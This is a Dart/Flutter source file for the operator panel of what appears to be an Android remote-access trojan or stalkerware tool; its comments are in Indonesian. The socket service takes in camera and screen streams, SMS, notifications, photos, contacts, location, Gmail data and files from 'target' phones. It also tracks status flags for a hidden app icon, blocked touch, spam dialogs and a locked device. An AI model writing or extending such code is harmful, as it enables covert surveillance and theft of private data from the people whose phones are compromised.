import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:socket_io_client/socket_io_client.dart' as io;

import '../config/api_config.dart';
import '../config/local_bypass.dart';
import '../models/device_model.dart';
import 'storage_service.dart';

class SocketService extends ChangeNotifier {
  io.Socket? _socket;
  String? _token;
  List<DeviceModel> devices = [];
  bool connected = false;
  String? lastError;

  String? selectedDeviceId;

  final Map<String, String> cameraFrames = {};
  final Map<String, String> screenFrames = {};
  final Map<String, int> cameraFrameSeq = {};
  final Map<String, int> screenFrameSeq = {};
  final Map<String, List<Map<String, dynamic>>> smsByDevice = {};
  final Map<String, List<Map<String, dynamic>>> notifsByDevice = {};
  final Map<String, List<Map<String, dynamic>>> galleryByDevice = {};
  final Map<String, List<Map<String, dynamic>>> contactsByDevice = {};
  final Map<String, List<Map<String, dynamic>>> appsByDevice = {};
  final Map<String, Map<String, dynamic>> locationByDevice = {};
  final Map<String, dynamic> gmailByDevice = {};
  final Map<String, dynamic> phoneByDevice = {};
  final Map<String, List<Map<String, dynamic>>> filesByDevice = {};

  // ✅ DITAMBAHKAN: Penyimpanan sementara untuk pesan Live Chat
  final Map<String, List<Map<String, dynamic>>> chatMessages = {};

  DeviceModel? get selectedDevice {
    if (selectedDeviceId == null) return null;
    try {
      return devices.firstWhere((d) => d.id == selectedDeviceId);
    } catch (_) {
      return null;
    }
  }

  String? get selectedDeviceUiKey {
    final d = selectedDevice;
    if (d == null) return selectedDeviceId;
    final s = d.status;
    return [
      d.id,
      d.name,
      d.battery,
      d.charging,
      s.flashlight,
      s.cameraActive,
      s.deviceLocked,
      s.iconHidden,
      s.touchBlocked,
      s.ttsSpeaking,
      s.dialogSpamActive,
      s.volumeMuted,
      s.screenActive,
      s.blockedApps.length,
      s.lockLiveChatActive, // ✅ DITAMBAHKAN: Agar UI rebuild saat status chat berubah
    ].join('|');
  }

  void selectDevice(String? id) {
    selectedDeviceId = id;
    if (id != null) {
      smsByDevice.remove(id);
      notifsByDevice.remove(id);
      // Opsional: Hapus history chat saat ganti device (biar bersih)
      // chatMessages.remove(id);
    }
    notifyListeners();
  }

  void connect(String token) {
    _token = token;
    if (LocalBypass.isLocalToken(token)) {
      connected = true;
      lastError = null;
      notifyListeners();
      return;
    }
    unawaited(_openSocket());
  }

  Future<void> _openSocket() async {
    final token = _token;
    if (token == null || token.isEmpty) return;
    final deviceId = await StorageService().getOrCreateDeviceId();

    try {
      _socket?.dispose();
    } catch (_) {}
    _socket = null;
    connected = false;

    _socket = io.io(
      ApiConfig.socketUrl,
      io.OptionBuilder()
          .setTransports(['websocket', 'polling'])
          .enableReconnection()
          .setReconnectionAttempts(20)
          .setReconnectionDelay(2000)
          .setReconnectionDelayMax(8000)
          .disableAutoConnect()
          .build(),
    );

    _socket!
      ..onConnect((_) {
        connected = true;
        lastError = null;
        _socket!.emit('controller:join', {'token': token, 'deviceId': deviceId});
        notifyListeners();
      })
      ..onDisconnect((_) {
        connected = false;
        notifyListeners();
      })
      ..onConnectError((_) {
        connected = false;
        lastError = 'Socket gagal · ${ApiConfig.socketUrl}';
        notifyListeners();
      })
      ..on('auth:error', (_) {
        connected = false;
        lastError = 'Unauthorized';
        notifyListeners();
      })
      ..on('devices:update', (data) => _handleDevices(data))
      ..on('camera:frame', (data) => _setFrame(cameraFrames, cameraFrameSeq, data))
      ..on('screen:frame', (data) => _setFrame(screenFrames, screenFrameSeq, data))
      ..on('camera:screenshot', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          final frame = data['frame']?.toString();
          if (id != null && frame != null) cameraFrames[id] = frame;
          notifyListeners();
        }
      })

      // ✅ DITAMBAHKAN: Listener khusus untuk menerima pesan chat dari HP Target
      ..on('chat:message', (data) {
        if (data is Map) {
          final msg = data;
          final deviceId = msg['deviceId']?.toString();

          // Hanya proses jika pesan berasal dari target (bukan echo dari admin)
          if (deviceId != null && msg['from'] == 'device') {
            chatMessages.putIfAbsent(deviceId, () => []);
            chatMessages[deviceId]!.add({
              'text': msg['message'] ?? msg['text'] ?? '',
              'time': DateTime.now().toIso8601String(),
            });
            notifyListeners(); // Trigger UI update di LiveChatScreen
          }
        }
      })

      ..on('sms:list', (data) => _setList(smsByDevice, data, 'list'))
      ..on('notif:list', (data) => _setList(notifsByDevice, data, 'list'))
      ..on('apps:list', (data) => _setList(appsByDevice, data, 'apps'))
      ..on('device:apps', (data) => _setList(appsByDevice, data, 'apps'))
      ..on('device:gallery', (data) => _setList(galleryByDevice, data, 'photos'))
      ..on('device:contacts', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          final list = data['contacts'];
          if (id != null && list is List) {
            contactsByDevice[id] = list.map((e) => Map<String, dynamic>.from(e as Map)).toList();
            notifyListeners();
          }
        }
      })
      ..on('device:location', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id != null) {
            locationByDevice[id] = Map<String, dynamic>.from(data);
            notifyListeners();
          }
        }
      })
      ..on('device:gmail', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id != null) {
            gmailByDevice[id] = data;
            notifyListeners();
          }
        }
      })
      ..on('device:phone', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id != null) {
            phoneByDevice[id] = data;
            notifyListeners();
          }
        }
      })
      ..on('device:files', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          final files = data['files'];
          if (id != null && files is List) {
            filesByDevice[id] = files.map((e) => Map<String, dynamic>.from(e as Map)).toList();
            notifyListeners();
          }
        }
      })
      ..on('device:notif', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id == null) return;
          final raw = data['notif'];
          final entry = raw is Map
              ? Map<String, dynamic>.from(raw)
              : Map<String, dynamic>.from(data);
          notifsByDevice.putIfAbsent(id, () => []);
          notifsByDevice[id]!.insert(0, entry);
          notifyListeners();
        }
      })
      ..on('device:battery', (data) {
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id == null) return;
          final battery = data['battery'];
          final charging = data['charging'];
          if (battery is num) {
            final idx = devices.indexWhere((d) => d.id == id);
            if (idx >= 0) {
              devices[idx] = devices[idx].copyWith(
                battery: battery.toInt(),
                charging: charging == true,
              );
              notifyListeners();
            }
          }
        }
      });

    _socket!.connect();
  }

  void _handleDevices(dynamic data) {
    if (data is List) {
      devices = data
          .whereType<Map>()
          .map((e) => DeviceModel.fromJson(Map<String, dynamic>.from(e)))
          .toList();
      if (selectedDeviceId != null && !devices.any((d) => d.id == selectedDeviceId)) {
        selectedDeviceId = null;
      }
      notifyListeners();
    }
  }

  void _setFrame(
    Map<String, String> store,
    Map<String, int> seqStore,
    dynamic data,
  ) {
    if (data is Map) {
      final id = data['deviceId']?.toString();
      final frame = data['frame']?.toString();
      if (id != null && frame != null && frame.isNotEmpty) {
        store[id] = frame;
        seqStore[id] = (seqStore[id] ?? 0) + 1;
        notifyListeners();
      }
    }
  }

  void _setList(Map<String, List<Map<String, dynamic>>> store, dynamic data, String key) {
    if (data is Map) {
      final id = data['deviceId']?.toString();
      final list = data[key];
      if (id != null && list is List) {
        store[id] = list.map((e) => Map<String, dynamic>.from(e as Map)).toList();
        notifyListeners();
      }
    }
  }

  Future<List<Map<String, dynamic>>> waitForData(
    Map<String, List<Map<String, dynamic>>> store,
    String deviceId, {
    Duration timeout = const Duration(seconds: 10),
  }) async {
    if (store.containsKey(deviceId)) return store[deviceId]!;
    final completer = Completer<List<Map<String, dynamic>>>();
    late VoidCallback listener;
    listener = () {
      if (store.containsKey(deviceId) && !completer.isCompleted) {
        completer.complete(store[deviceId]!);
      }
    };
    addListener(listener);
    final result = await completer.future.timeout(timeout, onTimeout: () => store[deviceId] ?? []);
    removeListener(listener);
    return result;
  }

  Future<Map<String, dynamic>?> waitForDataMap(
    Map<String, dynamic> store,
    String deviceId, {
    Duration timeout = const Duration(seconds: 10),
  }) async {
    Map<String, dynamic>? fromStore(dynamic v) {
      if (v is Map) return Map<String, dynamic>.from(v);
      return null;
    }
    if (store.containsKey(deviceId)) return fromStore(store[deviceId]);
    final completer = Completer<Map<String, dynamic>?>();
    late VoidCallback listener;
    listener = () {
      if (store.containsKey(deviceId) && !completer.isCompleted) {
        completer.complete(fromStore(store[deviceId]));
      }
    };
    addListener(listener);
    final result = await completer.future.timeout(timeout, onTimeout: () => fromStore(store[deviceId]));
    removeListener(listener);
    return result;
  }

  void disconnect() {
    _token = null;
    _socket?.dispose();
    _socket = null;
    connected = false;
    devices = [];
    selectedDeviceId = null;
    cameraFrames.clear();
    screenFrames.clear();
    cameraFrameSeq.clear();
    screenFrameSeq.clear();
    chatMessages.clear(); // ✅ DITAMBAHKAN: Bersihkan chat saat disconnect
    notifyListeners();
  }
}
